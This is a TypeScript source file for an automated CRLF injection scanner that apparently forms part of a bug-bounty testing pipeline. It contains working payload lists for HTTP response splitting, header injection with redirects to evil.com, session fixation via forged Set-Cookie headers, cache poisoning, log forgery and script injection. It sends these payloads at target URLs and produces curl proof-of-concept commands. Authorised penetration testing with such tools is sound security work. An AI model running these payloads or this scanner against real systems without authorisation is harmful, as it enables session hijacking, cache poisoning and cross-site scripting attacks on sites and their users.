/**
 * CRLF Injection Agent
 * Based on PayloadsAllTheThings/CRLF Injection
 * 
 * Detects and exploits CRLF injection vulnerabilities:
 * - HTTP Response Splitting
 * - Header Injection
 * - Log Injection
 * - Session Fixation via Set-Cookie
 * - XSS via injected headers
 * - Cache Poisoning
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface CRLFJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testAllParams?: boolean;
    testHeaders?: boolean;
    generatePOC?: boolean;
  };
}

// CRLF Payloads from PayloadsAllTheThings
const CRLF_PAYLOADS = {
  // Basic CRLF
  basic: [
    '%0d%0a',
    '%0D%0A',
    '%0d%0aSet-Cookie:crlfinjection=true',
    '%0d%0aX-Injected:header',
    '%0aSet-Cookie:crlfinjection=true',
    '%0d%0a%0d%0a<script>alert(1)</script>',
  ],

  // URL encoded variations
  urlEncoded: [
    '%0D%0ASet-Cookie:crlf=injection',
    '%0D%0A%0D%0A<html>injected</html>',
    '%E5%98%8A%E5%98%8D', // Unicode CRLF
    '%c0%8d%c0%8a', // Overlong UTF-8
  ],

  // Double encoding
  doubleEncoded: [
    '%250d%250a',
    '%25%30%64%25%30%61',
    '%252f%250d%250a',
  ],

  // Header injection
  headerInjection: [
    '%0d%0aLocation:https://evil.com',
    '%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>',
    '%0d%0aX-XSS-Protection:0%0d%0a',
    '%0d%0aAccess-Control-Allow-Origin:*',
  ],

  // Log injection
  logInjection: [
    '%0d%0a[CRITICAL] Fake log entry',
    '%0d%0aadmin logged in from 127.0.0.1',
    '%0d%0a%0d%0aFake HTTP Response',
  ],

  // Session fixation
  sessionFixation: [
    '%0d%0aSet-Cookie:PHPSESSID=attacker_session',
    '%0d%0aSet-Cookie:JSESSIONID=attacker_session',
    '%0d%0aSet-Cookie:session=attacker_session;Path=/;HttpOnly',
  ],

  // Cache poisoning
  cachePoisoning: [
    '%0d%0aX-Forwarded-Host:evil.com',
    '%0d%0aX-Original-URL:/admin',
    '%0d%0aX-Rewrite-URL:/admin',
  ],
};

// Injection points to test
const INJECTION_POINTS = [
  'url',           // URL path
  'query',         // Query parameters
  'referer',       // Referer header
  'user-agent',    // User-Agent header
  'x-forwarded',   // X-Forwarded-* headers
  'host',          // Host header
  'cookie',        // Cookie values
];

export class CRLFInjectionAgent extends BaseAgent<CRLFJob> {
  constructor() {
    super('crlfinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify injection points', metadata: {} },
      { name: 'Test CRLF payloads', metadata: {} },
      { name: 'Verify response splitting', metadata: {} },
      { name: 'Test header injection', metadata: {} },
      { name: 'Generate exploitation POCs', metadata: {} },
    ];
  }

  async process(job: Job<CRLFJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting CRLF injection testing');

    for (const url of urls) {
      try {
        // Test URL path injection
        const urlFindings = await this.testURLInjection(url);
        findings.push(...urlFindings);

        // Test query parameter injection
        const queryFindings = await this.testQueryInjection(url);
        findings.push(...queryFindings);

        // Test header injection if enabled
        if (options.testHeaders) {
          const headerFindings = await this.testHeaderInjection(url);
          findings.push(...headerFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing CRLF injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    // Publish findings via dynamic router
    for (const finding of findings) {
      await this.publishSignal(
        job.id!,
        programId,
        'vulnerability_potential',
        {
          type: 'crlf-injection',
          subtype: finding.type,
          url: finding.url,
          payload: finding.payload,
          severity: finding.severity,
          evidence: finding.evidence,
          poc: finding.poc,
          source: 'crlf-injection-agent',
        },
        finding.severity === 'critical' ? 1.0 : finding.severity === 'high' ? 0.9 : 0.8
      );
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async testURLInjection(baseUrl: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of [...CRLF_PAYLOADS.basic, ...CRLF_PAYLOADS.urlEncoded]) {
      try {
        const testUrl = `${baseUrl}/${payload}`;
        const response = await this.makeRequest(testUrl);

        if (this.detectCRLFInjection(response)) {
          findings.push({
            type: 'crlf-url-injection',
            url: baseUrl,
            payload,
            evidence: this.extractEvidence(response),
            severity: this.determineSeverity(response),
            poc: this.generatePOC(baseUrl, payload, 'url'),
          });
        }
      } catch (error) {
        // Request failed, continue
      }
    }

    return findings;
  }

  private async testQueryInjection(baseUrl: string): Promise<any[]> {
    const findings: any[] = [];
    const urlObj = new URL(baseUrl);
    const params = urlObj.searchParams;

    // Test each existing parameter
    for (const [param, value] of params.entries()) {
      for (const payload of CRLF_PAYLOADS.basic) {
        try {
          const testParams = new URLSearchParams(params);
          testParams.set(param, value + payload);
          const testUrl = `${urlObj.origin}${urlObj.pathname}?${testParams.toString()}`;

          const response = await this.makeRequest(testUrl);

          if (this.detectCRLFInjection(response)) {
            findings.push({
              type: 'crlf-query-injection',
              url: baseUrl,
              parameter: param,
              payload,
              evidence: this.extractEvidence(response),
              severity: this.determineSeverity(response),
              poc: this.generatePOC(baseUrl, payload, 'query', param),
            });
          }
        } catch (error) {
          // Continue testing
        }
      }
    }

    // Test with new parameter
    for (const payload of CRLF_PAYLOADS.headerInjection) {
      try {
        const testUrl = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}test=${payload}`;
        const response = await this.makeRequest(testUrl);

        if (this.detectCRLFInjection(response)) {
          findings.push({
            type: 'crlf-new-param-injection',
            url: baseUrl,
            payload,
            evidence: this.extractEvidence(response),
            severity: 'high',
            poc: this.generatePOC(baseUrl, payload, 'query', 'test'),
          });
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testHeaderInjection(url: string): Promise<any[]> {
    const findings: any[] = [];

    const headersToTest = [
      { name: 'Referer', payloads: CRLF_PAYLOADS.basic },
      { name: 'User-Agent', payloads: CRLF_PAYLOADS.basic },
      { name: 'X-Forwarded-For', payloads: CRLF_PAYLOADS.cachePoisoning },
      { name: 'X-Forwarded-Host', payloads: CRLF_PAYLOADS.cachePoisoning },
    ];

    for (const header of headersToTest) {
      for (const payload of header.payloads) {
        try {
          const response = await this.makeRequest(url, {
            headers: { [header.name]: `value${payload}` },
          });

          if (this.detectCRLFInjection(response)) {
            findings.push({
              type: 'crlf-header-injection',
              url,
              header: header.name,
              payload,
              evidence: this.extractEvidence(response),
              severity: 'high',
              poc: this.generatePOC(url, payload, 'header', header.name),
            });
          }
        } catch (error) {
          // Continue
        }
      }
    }

    return findings;
  }

  private async makeRequest(url: string, options: any = {}): Promise<any> {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    try {
      const response = await fetch(url, {
        method: 'GET',
        redirect: 'manual', // Don't follow redirects to see injected headers
        signal: controller.signal,
        ...options,
      });

      const headers: Record<string, string> = {};
      response.headers.forEach((value, key) => {
        headers[key] = value;
      });

      const body = await response.text();

      return {
        status: response.status,
        headers,
        body,
        url: response.url,
      };
    } finally {
      clearTimeout(timeout);
    }
  }

  private detectCRLFInjection(response: any): boolean {
    // Check for injected headers
    if (response.headers['x-injected'] || response.headers['crlfinjection']) {
      return true;
    }

    // Check for Set-Cookie with our marker
    const setCookie = response.headers['set-cookie'] || '';
    if (setCookie.includes('crlfinjection') || setCookie.includes('attacker_session')) {
      return true;
    }

    // Check for response splitting (body contains HTTP response)
    if (response.body.includes('HTTP/1.1 200') && response.body.includes('<script>')) {
      return true;
    }

    // Check for XSS in body due to CRLF
    if (response.body.includes('<script>alert(1)</script>') && !response.body.includes('&lt;script')) {
      return true;
    }

    return false;
  }

  private extractEvidence(response: any): any {
    return {
      status: response.status,
      injectedHeaders: Object.entries(response.headers)
        .filter(([k, v]) => 
          k.toLowerCase().includes('injected') || 
          (typeof v === 'string' && v.includes('crlf'))
        ),
      bodySnippet: response.body.substring(0, 500),
    };
  }

  private determineSeverity(response: any): string {
    // XSS via CRLF = Critical
    if (response.body.includes('<script>') && !response.body.includes('&lt;script')) {
      return 'critical';
    }

    // Session fixation = High
    const setCookie = response.headers['set-cookie'] || '';
    if (setCookie.includes('session') || setCookie.includes('PHPSESSID')) {
      return 'high';
    }

    // Header injection = Medium
    if (Object.keys(response.headers).some(h => h.toLowerCase().includes('injected'))) {
      return 'medium';
    }

    return 'low';
  }

  private generatePOC(url: string, payload: string, type: string, param?: string): string {
    if (type === 'url') {
      return `curl -i "${url}/${payload}"`;
    } else if (type === 'query') {
      return `curl -i "${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}"`;
    } else if (type === 'header') {
      return `curl -i -H "${param}: value${payload}" "${url}"`;
    }
    return '';
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, poc, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, $7, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding), finding.poc]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store CRLF finding');
    }
  }

  private async handoffToTriage(programId: string, scanId: string, findings: any[]): Promise<void> {
    // Handoff implementation
    logger.info({ findingCount: findings.length }, 'Handing off CRLF findings to triage');
  }
}

export default new CRLFInjectionAgent();
